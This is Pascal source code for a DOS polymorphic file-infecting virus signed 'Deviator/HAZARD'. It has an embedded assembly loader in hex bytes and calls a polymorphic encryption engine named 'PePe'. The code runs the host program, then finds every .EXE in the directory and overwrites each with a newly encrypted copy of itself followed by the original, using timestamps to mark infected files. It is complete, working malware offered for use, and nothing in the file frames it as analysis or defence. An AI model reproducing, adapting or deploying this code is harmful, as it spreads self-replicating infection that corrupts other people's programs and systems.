   { World First Pascal Polymorphic Virus }
   { By Deviator/HAZARD }
   { Uses ASM loader which drops pas virus and executes it }

   {$M $8000,$4000,$8000 }
   Uses Dos,PePe;
   Const
   VLen = 6553;            { Our len }
   GMem = 10000;
   FName = 'Victim.Exe';
   Loader  :   Array [0..$00000141] of Byte = (    { Our ASM loader }
       $E8,$00,$00,$5D,$1E,$0E,$1F,$B4,$3C,$8D,
       $96,$A8,$00,$33,$C9,$CD,$21,$73,$03,$E9,
       $91,$00,$93,$B4,$40,$8D,$96,$3F,$01,$B9,
       $10,$27,$CD,$21,$B4,$3E,$CD,$21,$1F,$B4,
       $4A,$8D,$9E,$0F,$09,$C1,$EB,$04,$43,$43,
       $CD,$21,$A1,$2C,$00,$1E,$8E,$C0,$33,$C0,
       $33,$FF,$B9,$00,$80,$F2,$AE,$AE,$75,$FB,
       $AF,$0E,$06,$57,$5E,$1F,$07,$8D,$BE,$BF,
       $00,$AC,$AA,$2E,$FE,$86,$BD,$00,$2E,$80,
       $BE,$BD,$00,$7F,$73,$04,$3C,$00,$75,$ED,
       $4F,$1F,$BE,$80,$00,$AC,$3C,$00,$74,$15,
       $33,$C9,$8A,$C8,$AC,$AA,$2E,$FE,$86,$BD,
       $00,$2E,$80,$BE,$BD,$00,$7F,$73,$02,$E2,
       $EF,$90,$2E,$01,$AE,$B1,$00,$2E,$8C,$8E,
       $B3,$00,$2E,$8C,$9E,$B7,$00,$2E,$8C,$9E,
       $BB,$00,$0E,$1F,$8D,$96,$A8,$00,$8D,$9E,
       $AF,$00,$B8,$00,$4B,$CD,$21,$B4,$4C,$CD,
       $21,$56,$69,$2E,$65,$78,$65,$00,$00,$00,
       $BD,$00,$00,$00,$5C,$00,$00,$00,$6C,$00,
       $00,$00,$00,$20,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00,$00,$00,$00,$00,$00,$00,$00,$00,
       $00,$00);
   Var
   FIn,FOut : File;
   OurSt,Temp,Crypted : Pointer;
   FSearch : SearchRec;
   NumRead,G,NSize,L,K,H : Word;
   B:String;

   Begin

   B := #13#10'World First Polymorphic Pascal Virus !'#13#10+
        '  Featuring PePe v.1.0 ;) - Pascal Extra Polymorphics Engine !'#13#10+
        '    I was surprised, when this stuff worked...<:P'+
        '       By Deviator/HAZARD'#13#10;

   Assign(FIn,paramstr(0));            { Read our body }
   Reset(FIn,1);
   Getmem(OurSt,VLen);
   Blockread(FIn,OurSt^,VLen);
   Close(FIn);                 { Erase body }
   Erase(FIn);

   Assign(Fin,paramstr(1));            { Read host body }
   Reset(FIn,1);                   { As paramstr(1) transferred
                             from loader our real name }
   Seek(FIn,$12);
   BlockRead(FIn,G,2);
   Seek(FIn,G);
   GetMem(Temp,GMem);

   Assign(Fout,FName);
   Rewrite(Fout,1);
   Repeat
   Blockread(Fin,Temp^,GMem,NumRead);      { Copy host }
   Blockwrite(FOut,Temp^,NumRead);
   Until eof(FIn);
   Close(FIn);
   Close(FOut);
   Freemem(Temp,GMem);

   B := '';
   For G := 2 to ParamCount do B := B + ' ' + Paramstr(G);
   SwapVectors;
   Exec(FName, B);                 { Exec host }
   SwapVectors;

   Assign(Fin,FName);              { Erase it  ! }
   Erase(Fin);

   Getmem(Temp,GMem);
   GetMem(Crypted,SizeOf(Loader)+VLen+3000);   { Get mem + 3000 }

   FindFirst('*.ExE',AnyFile,FSearch);     { Find .Exe }

   While DosError = 0 do
   Begin
    If FSearch.Time <> 0 then Begin
     Assign(FIn,FSearch.Name);
     Rename(FIn,FName);
     Assign(Fout,FSearch.Name);            { Open file for infection }
     Rewrite(FOut,1);
     Reset(FIn,1);
     NSize := DoPoly(Addr(Loader),OurSt,SizeOf(Loader)-2,VLen,Crypted);
                           { Crypt us. Note that
                             loader is padded for two
                             bytes. PePe crypts two
                             additional bytes,so
                             just skip em }
     BlockWrite(FOut,Crypted^,NSize);      { Write polycreated copy }
     Repeat
     Blockread(FIn,Temp^,GMem,NumRead);        { Copy victim to our end }
     Blockwrite(FOut,Temp^,NumRead);
     Until eof(Fin);
     SetFTime(FOut,000);               { Mark FIle }
     Close(Fin);
     Close(FOut);
     Erase(Fin);                   { Delete File }
    End;
     FindNext(FSearch);                { Next File }
   end;
     FreeMem(Crypted,SizeOf(Loader)+VLen+3000);    { Release mem }
     Freemem(Temp,GMem);

   { Thats all. So nothing is impossible ! }

   End.
